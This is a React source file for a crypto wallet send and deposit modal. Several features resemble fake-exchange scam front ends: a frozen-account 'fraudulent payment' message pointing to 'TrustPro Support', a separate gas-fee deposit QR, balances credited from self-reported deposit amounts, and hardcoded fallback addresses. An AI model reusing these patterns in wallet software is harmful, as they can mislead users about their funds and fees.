import React, { useState } from 'react';
import { useWallet, getUserReceiveAddress, isAddressMatchingUser } from '../context/WalletContext';
import { CryptoIcon } from './CryptoIcon';
import {
  X,
  Send,
  Download,
  Copy,
  Check,
  QrCode,
  AlertCircle,
  Zap,
  CheckCircle2,
  Clock,
  Layers,
  Clipboard,
  UserCheck,
  Globe,
  ChevronDown,
  Search,
} from 'lucide-react';

export const SendReceiveModal: React.FC = () => {
  const {
    isSendModalOpen,
    setIsSendModalOpen,
    isReceiveModalOpen,
    setIsReceiveModalOpen,
    selectedAssetForModal,
    setSelectedAssetForModal,
    assets,
    currentUser,
    users,
    sendCrypto,
    depositCrypto,
    depositAddresses,
    withdrawAddresses,
    networkFeeQrCode,
  } = useWallet();

  const [toAddress, setToAddress] = useState('');
  const [amount, setAmount] = useState('');
  const [depositAmount, setDepositAmount] = useState('');
  const [customTxHash, setCustomTxHash] = useState('');
  const [feeSpeed, setFeeSpeed] = useState<'slow' | 'standard' | 'fast'>('standard');
  const [copied, setCopied] = useState(false);
  const [txResult, setTxResult] = useState<{ success: boolean; message: string; txHash?: string } | null>(null);
  const [depositResult, setDepositResult] = useState<{ success: boolean; message: string; txHash?: string } | null>(null);

  // Asset Picker modal state and search
  const [isAssetPickerOpen, setIsAssetPickerOpen] = useState(false);
  const [assetSearchQuery, setAssetSearchQuery] = useState('');

  const activeAsset = selectedAssetForModal || assets[0];
  const userBalance = currentUser?.balances[activeAsset.symbol] || 0;
  const numAmount = parseFloat(amount) || 0;
  const amountUsd = numAmount * activeAsset.priceUsd;

  const filteredAssetList = assets.filter((a) => {
    const q = assetSearchQuery.trim().toLowerCase();
    if (!q) return true;
    return a.name.toLowerCase().includes(q) || a.symbol.toLowerCase().includes(q);
  });

  // Selected Network for Send or Receive
  const [selectedNetwork, setSelectedNetwork] = useState<string>('TRC-20');

  // Multi-network options based on selected coin
  const getNetworkOptions = (symbol: string) => {
    const sym = symbol.toUpperCase();
    if (sym === 'USDT' || sym === 'USDC') {
      return ['TRC-20', 'ERC-20', 'BEP-20', 'Solana SPL', 'Polygon'];
    }
    if (sym === 'BTC') {
      return ['Bitcoin Native', 'BEP-20', 'ERC-20 (WBTC)'];
    }
    if (sym === 'ETH') {
      return ['ERC-20', 'BEP-20', 'Arbitrum One', 'Optimism'];
    }
    if (sym === 'BNB') {
      return ['BEP-20', 'BEP-2'];
    }
    if (sym === 'SOL') {
      return ['Solana SPL'];
    }
    if (sym === 'TRX') {
      return ['TRC-20'];
    }
    return ['TRC-20', 'ERC-20', 'BEP-20'];
  };

  const networkList = getNetworkOptions(activeAsset.symbol);
  const currentActiveNetwork = networkList.includes(selectedNetwork) ? selectedNetwork : networkList[0];

  const currentDepositAddress = activeAsset.symbol === 'GAS_TRX'
    ? depositAddresses['GAS_TRX'] || 'TB7zZxcAr6NKR6nF231t2ZWYPTu1TUrDE6'
    : (currentUser
      ? getUserReceiveAddress(currentUser, activeAsset.symbol, currentActiveNetwork)
      : depositAddresses[activeAsset.symbol] ||
        depositAddresses.DEFAULT ||
        '0x71C7656EC7ab88b098defB751B7401B5f6d8976F');

  const handleSendSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (currentUser?.isFrozen) {
      setTxResult({
        success: false,
        message: 'Your account is frozen due to verification of a fraudulent payment. Contact TrustPro Support.',
      });
      return;
    }
    if (!toAddress || numAmount <= 0) return;

    const res = sendCrypto(activeAsset.symbol, numAmount, toAddress, currentActiveNetwork);
    setTxResult(res);

    if (res.success) {
      setTimeout(() => {
        setIsSendModalOpen(false);
        setTxResult(null);
        setAmount('');
        setToAddress('');
      }, 2500);
    }
  };

  const handleDepositSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    const depNum = parseFloat(depositAmount);
    if (!depNum || depNum <= 0) return;

    const res = depositCrypto(activeAsset.symbol, depNum, customTxHash || undefined, undefined, currentActiveNetwork);
    setDepositResult(res);

    if (res.success) {
      setTimeout(() => {
        setIsReceiveModalOpen(false);
        setDepositResult(null);
        setDepositAmount('');
        setCustomTxHash('');
      }, 2500);
    }
  };

  const handleCopyReceiveAddress = () => {
    navigator.clipboard.writeText(currentDepositAddress);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  if (!isSendModalOpen && !isReceiveModalOpen) return null;

  return (
    <>
      <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/80 backdrop-blur-md animate-fadeIn">
        {/* SEND MODAL */}
      {isSendModalOpen && (
        <div className="relative w-full max-w-md rounded-3xl bg-[#0e1015] border border-slate-800 p-6 shadow-2xl">
          <button
            onClick={() => {
              setIsSendModalOpen(false);
              setTxResult(null);
            }}
            className="absolute top-4 right-4 h-8 w-8 rounded-full bg-slate-900 border border-slate-800 flex items-center justify-center text-slate-400 hover:text-white"
            id="close-send-modal"
          >
            <X className="h-4 w-4" />
          </button>

          <div className="flex items-center gap-3 mb-4">
            <div className="h-10 w-10 rounded-2xl bg-rose-500/10 border border-rose-500/30 flex items-center justify-center text-rose-400">
              <Send className="h-5 w-5" />
            </div>
            <div>
              <h3 className="text-lg font-bold text-white">Send Crypto</h3>
              <p className="text-xs text-slate-400">Transfer tokens across verified networks</p>
            </div>
          </div>

          {/* Processing Time Notice */}
          <div className="mb-4 rounded-2xl bg-blue-300/10 border border-blue-300/30 p-3 text-left flex items-start gap-2.5">
            <Clock className="h-4 w-4 text-blue-300 shrink-0 mt-0.5" />
            <div>
              <p className="text-[11px] font-bold text-blue-300">Processing Protocol Notice</p>
              <p className="text-[10px] text-blue-300/90 leading-relaxed mt-0.5">
                On-Chain Security Verification: Direct protocol transfers process instantly. External network withdrawals take <strong>30 minutes to 24 hours</strong> with active multi-node confirmation timer.
              </p>
            </div>
          </div>

          {txResult ? (
            <div className="text-center py-6">
              {txResult.success ? (
                <>
                  <CheckCircle2 className="h-14 w-14 text-[#38B6FF] mx-auto mb-3 animate-bounce" />
                  <h4 className="text-lg font-bold text-white">Transfer Initiated!</h4>
                  <p className="text-xs text-slate-400 mt-1">{txResult.message}</p>
                  <p className="text-[10px] font-mono text-[#38B6FF] mt-2 truncate">Tx: {txResult.txHash}</p>
                </>
              ) : (
                <>
                  <AlertCircle className="h-14 w-14 text-rose-400 mx-auto mb-3" />
                  <h4 className="text-lg font-bold text-white">Transfer Failed</h4>
                  <p className="text-xs text-rose-400 mt-1">{txResult.message}</p>
                </>
              )}
            </div>
          ) : (
            <form onSubmit={handleSendSubmit} className="space-y-4">
              {/* Interactive Asset Selector */}
              <div>
                <div className="flex justify-between items-center mb-1">
                  <label className="text-[11px] font-semibold text-slate-400">Select Asset</label>
                  <span className="text-[10px] text-[#38B6FF] font-mono font-bold">
                    {assets.length} Assets Available
                  </span>
                </div>
                <button
                  type="button"
                  onClick={() => setIsAssetPickerOpen(true)}
                  className="w-full flex items-center justify-between rounded-2xl bg-slate-950 border border-slate-800 p-3 hover:border-[#3862FB]/50 transition-all text-left shadow-inner"
                >
                  <div className="flex items-center gap-2.5">
                    <CryptoIcon
                      symbol={activeAsset.symbol}
                      src={activeAsset.icon}
                      name={activeAsset.name}
                      size="sm"
                    />
                    <div>
                      <p className="text-xs font-bold text-white leading-tight">
                        {activeAsset.name} <span className="text-[#38B6FF] font-mono">({activeAsset.symbol})</span>
                      </p>
                      <p className="text-[10px] text-slate-400 font-mono mt-0.5">
                        Balance: <strong className="text-white">{currentUser?.balances[activeAsset.symbol] || 0} {activeAsset.symbol}</strong> • ${activeAsset.priceUsd.toLocaleString()}
                      </p>
                    </div>
                  </div>
                  <div className="flex items-center gap-1.5 px-2.5 py-1.5 rounded-xl bg-slate-900 border border-slate-800 text-xs font-bold text-[#38B6FF] hover:bg-slate-800 transition-all">
                    <span>Change</span>
                    <ChevronDown className="h-3.5 w-3.5 text-[#38B6FF]" />
                  </div>
                </button>
              </div>

              {/* Network Standard Option */}
              <div>
                <label className="block text-[11px] font-semibold text-slate-400 mb-1 flex items-center gap-1">
                  <Layers className="h-3 w-3 text-[#38B6FF]" />
                  <span>Choose Transfer Network Standard</span>
                </label>
                <div className="grid grid-cols-3 gap-1.5">
                  {networkList.map((net) => (
                    <button
                      key={net}
                      type="button"
                      onClick={() => setSelectedNetwork(net)}
                      className={`px-2.5 py-2 rounded-xl text-xs font-bold transition-all border ${
                        currentActiveNetwork === net
                          ? 'bg-[#3862FB] text-white border-[#3862FB] shadow-md shadow-[#3862FB]/20'
                          : 'bg-slate-950 text-slate-400 border-slate-800 hover:text-white'
                      }`}
                    >
                      {net}
                    </button>
                  ))}
                </div>
              </div>

              {/* Address Input */}
              <div>
                <div className="flex justify-between items-center text-[11px] font-semibold text-slate-400 mb-1">
                  <span>Recipient Address ({currentActiveNetwork})</span>
                </div>
                <div className="relative">
                  <input
                    type="text"
                    placeholder={`Paste recipient ${activeAsset.symbol} (${currentActiveNetwork}) address, email, or user ID...`}
                    value={toAddress}
                    onChange={(e) => setToAddress(e.target.value)}
                    required
                    className="w-full rounded-xl bg-slate-950 border border-slate-800 pl-3 pr-16 py-2.5 text-xs text-white font-mono focus:outline-none focus:border-[#3862FB]"
                  />
                  <button
                    type="button"
                    onClick={async () => {
                      try {
                        const text = await navigator.clipboard.readText();
                        if (text) setToAddress(text.trim());
                      } catch (err) {
                        console.warn('Clipboard read failed:', err);
                      }
                    }}
                    className="absolute right-2 top-1/2 -translate-y-1/2 flex items-center gap-1 px-2 py-1 rounded-lg bg-slate-800 hover:bg-slate-700 text-[10px] text-[#38B6FF] font-bold transition-all"
                  >
                    <Clipboard className="h-3 w-3" />
                    <span>Paste</span>
                  </button>
                </div>
              </div>

              {/* Amount Input */}
              <div>
                <div className="flex justify-between text-[11px] font-semibold text-slate-400 mb-1">
                  <span>Amount</span>
                  <button
                    type="button"
                    onClick={() => setAmount(userBalance.toString())}
                    className="text-[#38B6FF] font-bold hover:underline"
                  >
                    MAX: {userBalance} {activeAsset.symbol}
                  </button>
                </div>
                <div className="relative">
                  <input
                    type="number"
                    step="any"
                    placeholder="0.00"
                    value={amount}
                    onChange={(e) => setAmount(e.target.value)}
                    required
                    className="w-full rounded-xl bg-slate-950 border border-slate-800 px-3 py-2.5 text-sm font-mono text-white focus:outline-none focus:border-[#3862FB]"
                  />
                  <span className="absolute right-3 top-3 text-xs text-slate-500 font-bold">
                    ≈ ${amountUsd.toFixed(2)}
                  </span>
                </div>
              </div>

              {/* Gas Speed Tiers */}
              <div>
                <label className="block text-[11px] font-semibold text-slate-400 mb-1">Gas Network Speed</label>
                <div className="grid grid-cols-3 gap-2">
                  {[
                    { id: 'slow', label: 'Slow', fee: '$0.50' },
                    { id: 'standard', label: 'Standard', fee: '$1.25' },
                    { id: 'fast', label: 'Fast', fee: '$3.00' },
                  ].map((tier) => (
                    <button
                      key={tier.id}
                      type="button"
                      onClick={() => setFeeSpeed(tier.id as any)}
                      className={`p-2 rounded-xl text-center border text-xs transition-all ${
                        feeSpeed === tier.id
                          ? 'border-[#3862FB] bg-[#3862FB]/10 text-[#38B6FF] font-bold'
                          : 'border-slate-800 bg-slate-950 text-slate-400'
                      }`}
                    >
                      <p className="font-semibold">{tier.label}</p>
                      <p className="text-[10px] font-mono text-slate-500">{tier.fee}</p>
                    </button>
                  ))}
                </div>
              </div>

              <button
                type="submit"
                className="w-full rounded-xl bg-[#3862FB] py-3 text-xs font-bold text-white hover:bg-[#2D54E5] transition-all shadow-lg"
                id="submit-send-crypto-btn"
              >
                Confirm & Send {numAmount > 0 ? `${numAmount} ${activeAsset.symbol}` : ''}
              </button>
            </form>
          )}
        </div>
      )}

      {/* RECEIVE / DEPOSIT MODAL */}
      {isReceiveModalOpen && (
        <div className="relative w-full max-w-md rounded-3xl bg-[#0e1015] border border-slate-800 p-6 shadow-2xl text-center max-h-[90vh] overflow-y-auto">
          <button
            onClick={() => {
              setIsReceiveModalOpen(false);
              setDepositResult(null);
            }}
            className="absolute top-4 right-4 h-8 w-8 rounded-full bg-slate-900 border border-slate-800 flex items-center justify-center text-slate-400 hover:text-white z-10"
            id="close-receive-modal"
          >
            <X className="h-4 w-4" />
          </button>

          <div className="mx-auto h-12 w-12 rounded-2xl bg-[#3862FB]/10 border border-[#3862FB]/30 flex items-center justify-center text-[#38B6FF] mb-2">
            <Download className="h-6 w-6" />
          </div>
          <h3 className="text-lg font-bold text-white">Deposit Crypto</h3>
          <p className="text-xs text-slate-400 mb-3">Select coin, network, and copy your real vault address</p>

          {/* Deposit Settlement Notice */}
          <div className="mb-4 rounded-2xl bg-blue-300/10 border border-blue-300/30 p-3 text-left flex items-start gap-2.5">
            <Clock className="h-4 w-4 text-blue-300 shrink-0 mt-0.5" />
            <div>
              <p className="text-[11px] font-bold text-blue-300">Deposit Settlement Protocol</p>
              <p className="text-[10px] text-blue-200/90 leading-relaxed mt-0.5">
                On-chain deposits undergo multi-node validation. Verification time ranges from <strong>30 minutes to 24 hours</strong> based on block confirmations.
              </p>
            </div>
          </div>

          {/* Coin Selector (Always Enabled) */}
          <div className="mb-3 text-left">
            <label className="block text-[10px] font-bold text-slate-400 mb-1">Select Coin to Deposit</label>
            <button
              type="button"
              onClick={() => setIsAssetPickerOpen(true)}
              className="w-full flex items-center justify-between rounded-2xl bg-slate-950 border border-slate-800 p-2.5 hover:border-[#3862FB]/50 transition-all text-left"
            >
              <div className="flex items-center gap-2.5">
                <CryptoIcon
                  symbol={activeAsset.symbol}
                  src={activeAsset.icon}
                  name={activeAsset.name}
                  size="sm"
                />
                <div>
                  <p className="text-xs font-bold text-white leading-tight">
                    {activeAsset.name} <span className="text-[#38B6FF] font-mono">({activeAsset.symbol})</span>
                  </p>
                  <p className="text-[10px] text-slate-400 font-mono mt-0.5">
                    Rate: ${activeAsset.priceUsd.toLocaleString()} USD
                  </p>
                </div>
              </div>
              <div className="flex items-center gap-1.5 px-2.5 py-1 rounded-xl bg-slate-900 border border-slate-800 text-xs font-bold text-[#38B6FF] hover:bg-slate-800 transition-all">
                <span>Select Coin</span>
                <ChevronDown className="h-3.5 w-3.5 text-[#38B6FF]" />
              </div>
            </button>
          </div>

          {/* Choose Network Standard */}
          {activeAsset.symbol !== 'GAS_TRX' && (
            <div className="mb-4 text-left">
              <label className="block text-[11px] font-semibold text-slate-400 mb-1 flex items-center gap-1">
                <Layers className="h-3 w-3 text-[#38B6FF]" />
                <span>Select Deposit Network Option</span>
              </label>
              <div className="grid grid-cols-3 gap-1.5">
                {networkList.map((net) => (
                  <button
                    key={net}
                    type="button"
                    onClick={() => setSelectedNetwork(net)}
                    className={`px-2.5 py-1.5 rounded-xl text-xs font-bold transition-all border ${
                      currentActiveNetwork === net
                        ? 'bg-[#3862FB] text-white border-[#3862FB] shadow-md shadow-[#3862FB]/20'
                        : 'bg-slate-950 text-slate-400 border-slate-800 hover:text-white'
                    }`}
                  >
                    {net}
                  </button>
                ))}
              </div>
            </div>
          )}

          {/* QR Code */}
          <div className="mx-auto my-3 w-44 h-44 rounded-2xl bg-white p-2 flex flex-col items-center justify-center border-4 border-[#3862FB]/20 shadow-inner overflow-hidden">
            <img
              src={
                activeAsset.symbol === 'GAS_TRX' && networkFeeQrCode
                  ? networkFeeQrCode
                  : `https://api.qrserver.com/v1/create-qr-code/?size=180x180&data=${encodeURIComponent(
                      currentDepositAddress
                    )}`
              }
              alt="Deposit QR Code"
              className="h-32 w-32 object-contain"
              referrerPolicy="no-referrer"
            />
            <span className="text-[10px] font-mono font-bold text-black mt-1 uppercase">
              {activeAsset.symbol} ({currentActiveNetwork})
            </span>
          </div>

          <p className="text-xs text-slate-400 font-medium mb-1 text-left">
            Your {activeAsset.symbol} Deposit Address ({currentActiveNetwork}):
          </p>
          <div className="flex items-center justify-between rounded-xl bg-slate-950 border border-slate-800 p-2.5 mb-3">
            <span className="font-mono text-xs text-[#38B6FF] truncate">
              {currentDepositAddress}
            </span>
            <button
              onClick={handleCopyReceiveAddress}
              className="p-1.5 rounded-lg bg-slate-800 text-slate-200 hover:text-white shrink-0 ml-2"
              title="Copy Deposit Address"
              id="copy-deposit-addr-btn"
            >
              {copied ? <Check className="h-4 w-4 text-[#38B6FF]" /> : <Copy className="h-4 w-4" />}
            </button>
          </div>

          {depositResult ? (
            <div className="py-4 text-center rounded-2xl bg-slate-950 border border-[#3862FB]/30 p-4">
              <CheckCircle2 className="h-10 w-10 text-[#38B6FF] mx-auto mb-2 animate-bounce" />
              <h4 className="text-sm font-bold text-white">Deposit Request Logged!</h4>
              <p className="text-xs text-slate-300 mt-1">{depositResult.message}</p>
              <p className="text-[10px] font-mono text-[#38B6FF] mt-2 truncate">Tx: {depositResult.txHash}</p>
            </div>
          ) : (
            <form onSubmit={handleDepositSubmit} className="space-y-3 border-t border-slate-800/80 pt-4 text-left">
              <p className="text-xs font-bold text-slate-300 flex items-center gap-1.5">
                <Zap className="h-3.5 w-3.5 text-[#38B6FF]" />
                <span>Submit Deposit Notification</span>
              </p>

              <div>
                <label className="block text-[11px] font-semibold text-slate-400 mb-1">
                  Deposit Amount ({activeAsset.symbol})
                </label>
                <input
                  type="number"
                  step="any"
                  placeholder={`Amount in ${activeAsset.symbol}...`}
                  value={depositAmount}
                  onChange={(e) => setDepositAmount(e.target.value)}
                  required
                  className="w-full rounded-xl bg-slate-950 border border-slate-800 px-3 py-2 text-xs text-white font-mono focus:outline-none focus:border-[#3862FB]"
                />
              </div>

              <div>
                <label className="block text-[11px] font-semibold text-slate-400 mb-1">Tx Hash / Proof (Optional)</label>
                <input
                  type="text"
                  placeholder="Paste transaction hash if available..."
                  value={customTxHash}
                  onChange={(e) => setCustomTxHash(e.target.value)}
                  className="w-full rounded-xl bg-slate-950 border border-slate-800 px-3 py-2 text-xs text-white font-mono focus:outline-none focus:border-[#3862FB]"
                />
              </div>

              <button
                type="submit"
                className="w-full rounded-xl bg-[#3862FB] py-2.5 text-xs font-bold text-white hover:bg-[#2D54E5] transition-all shadow-md shadow-[#3862FB]/20"
                id="submit-deposit-btn"
              >
                Submit Deposit Request
              </button>
            </form>
          )}

          <div className="mt-4 rounded-xl bg-blue-300/10 border border-blue-300/20 p-2.5 text-left text-[11px] text-blue-300">
            Send only <strong className="text-white">{activeAsset.symbol}</strong> via <strong className="text-white">{currentActiveNetwork}</strong> to this address.
          </div>
        </div>
      )}

      </div>

      {/* SEARCHABLE ASSET PICKER OVERLAY MODAL */}
      {isAssetPickerOpen && (
        <div className="fixed inset-0 z-[100] flex items-center justify-center p-4 bg-black/85 backdrop-blur-md animate-fadeIn">
          <div className="relative w-full max-w-md rounded-3xl bg-[#0e1015] border border-slate-800 p-5 shadow-2xl flex flex-col max-h-[85vh]">
            <div className="flex items-center justify-between pb-3 border-b border-slate-800">
              <div>
                <h4 className="text-sm font-bold text-white flex items-center gap-2">
                  <span>Select Crypto Asset</span>
                  <span className="text-[10px] bg-slate-800 text-[#38B6FF] px-2 py-0.5 rounded-full font-mono font-bold">
                    {assets.length} Coins
                  </span>
                </h4>
                <p className="text-[11px] text-slate-400">Choose coin to transfer or receive</p>
              </div>
              <button
                type="button"
                onClick={() => {
                  setIsAssetPickerOpen(false);
                  setAssetSearchQuery('');
                }}
                className="h-8 w-8 rounded-full bg-slate-900 border border-slate-800 flex items-center justify-center text-slate-400 hover:text-white"
              >
                <X className="h-4 w-4" />
              </button>
            </div>

            <div className="py-3">
              <div className="relative">
                <Search className="absolute left-3 top-2.5 h-4 w-4 text-slate-500" />
                <input
                  type="text"
                  placeholder="Search by coin name or symbol (e.g. BTC, ETH, USDT)..."
                  value={assetSearchQuery}
                  onChange={(e) => setAssetSearchQuery(e.target.value)}
                  className="w-full rounded-xl bg-slate-950 border border-slate-800 pl-9 pr-3 py-2 text-xs text-white focus:outline-none focus:border-[#3862FB] font-medium"
                  autoFocus
                />
              </div>
            </div>

            <div className="flex-1 overflow-y-auto space-y-2 pr-1 custom-scrollbar">
              {filteredAssetList.length === 0 ? (
                <div className="text-center text-xs text-slate-500 py-8">
                  <p>No asset matching "{assetSearchQuery}"</p>
                </div>
              ) : (
                filteredAssetList.map((a) => {
                  const bal = currentUser?.balances[a.symbol] || 0;
                  const isSelected = activeAsset.symbol === a.symbol;
                  return (
                    <button
                      key={a.id}
                      type="button"
                      onClick={() => {
                        setSelectedAssetForModal(a);
                        setIsAssetPickerOpen(false);
                        setAssetSearchQuery('');
                      }}
                      className={`w-full flex items-center justify-between p-3 rounded-2xl border transition-all text-left ${
                        isSelected
                          ? 'bg-[#3862FB]/15 border-[#3862FB]/50 text-white shadow-md shadow-[#3862FB]/10'
                          : 'bg-slate-950/70 border-slate-800 hover:bg-slate-900 hover:border-slate-700'
                      }`}
                    >
                      <div className="flex items-center gap-3">
                        <CryptoIcon
                          symbol={a.symbol}
                          src={a.icon}
                          name={a.name}
                          size="sm"
                        />
                        <div>
                          <div className="flex items-center gap-1.5">
                            <span className="text-xs font-bold text-white">{a.name}</span>
                            <span className="text-[10px] font-mono text-[#38B6FF] font-bold bg-slate-900 px-1.5 py-0.5 rounded border border-slate-800">
                              {a.symbol}
                            </span>
                          </div>
                          <p className="text-[10px] text-slate-400 font-mono mt-0.5">
                            Price: ${a.priceUsd.toLocaleString()}
                          </p>
                        </div>
                      </div>
                      <div className="text-right font-mono">
                        <p className="text-xs font-bold text-[#38B6FF]">
                          {bal} {a.symbol}
                        </p>
                        <p className="text-[10px] text-slate-500">
                          ≈ ${(bal * a.priceUsd).toFixed(2)}
                        </p>
                      </div>
                    </button>
                  );
                })
              )}
            </div>
          </div>
        </div>
      )}
    </>
  );
};
